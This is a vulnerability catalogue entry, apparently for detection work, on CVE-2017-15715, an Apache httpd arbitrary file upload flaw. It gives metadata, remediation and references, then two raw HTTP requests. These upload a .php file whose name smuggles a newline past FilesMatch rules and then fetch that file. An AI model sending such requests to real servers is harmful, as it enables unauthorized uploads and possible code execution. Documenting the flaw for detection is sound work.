---
layout: post
cve_id: CVE-2017-15715
title: Apache httpd <=2.4.29 - Arbitrary File Upload
pcap: true
pcap_path: /pcaps/2017/CVE-2017-15715.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2017/CVE-2017-15715.yaml
snort2_rule: N/A
snort3_rule: N/A
author: geeknik
severity: high
impact: 'An attacker can upload malicious files to the server, leading to remote code
  execution or unauthorized access.

  '
remediation: 'Upgrade Apache httpd to a version higher than 2.4.29 or apply the necessary
  patches.

  '
reference:
- https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715
- https://httpd.apache.org/security/vulnerabilities_24.html
- http://www.openwall.com/lists/oss-security/2018/03/24/6
- https://nvd.nist.gov/vuln/detail/CVE-2017-15715
- http://www.securitytracker.com/id/1040570
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 8.1
  cve-id: CVE-2017-15715
  cwe-id: CWE-20
  epss-score: 0.94023
  epss-percentile: 0.99887
  cpe: cpe:2.3:a:apache:http_server:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: apache
  product: http_server
  shodan-query:
  - cpe:"cpe:2.3:a:apache:http_server"
  - apache 2.4.49
tags:
- cve
- cve2017
- apache
- httpd
- fileupload
- vulhub
- intrusive
- vkev
- vuln
---

## üîç Vulnerability Description
Apache httpd 2.4.0 to 2.4.29 is susceptible to arbitrary file upload vulnerabilities via the expression specified in <FilesMatch>, which could match '$' to a newline character in a malicious filename rather than matching only the end of the filename. This could be exploited in environments where uploads of some files are externally blocked, but only by matching the trailing portion of the filename.

## üåê HTTP Request
```nohighlight
POST / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Connection: close
Content-Length: 334
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKc8fBVDo558U4hbJ
Accept-Encoding: gzip

------WebKitFormBoundaryKc8fBVDo558U4hbJ
Content-Disposition: form-data; name="file"; filename="38Ff30xOtIR577GqZUVRrXAk9OS.php"

38Ff31GrDXIwRnMU4Cen3AsJn9S

------WebKitFormBoundaryKc8fBVDo558U4hbJ
Content-Disposition: form-data; name="name"

38Ff30xOtIR577GqZUVRrXAk9OS.php\x0A
------WebKitFormBoundaryKc8fBVDo558U4hbJ--
```

```nohighlight
GET /38Ff30xOtIR577GqZUVRrXAk9OS.php%5Cx0A HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.12
Connection: close
Accept: */*
Accept-Encoding: gzip,deflate
```

